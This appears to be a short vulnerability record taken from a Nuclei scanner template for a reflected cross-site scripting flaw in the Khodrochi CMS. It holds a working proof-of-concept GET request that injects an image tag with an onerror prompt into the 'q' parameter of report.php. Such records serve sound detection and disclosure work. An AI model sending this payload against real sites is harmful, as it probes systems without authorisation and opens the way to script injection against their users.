# Vulnerability: Khodrochi CMS - Cross Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`khodrochi-cms-xss.yaml`)

## Description
A cross site scripting vulnerability was found in the Khodrochi.ir CMS an Iranian Car Services Platform.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E
```

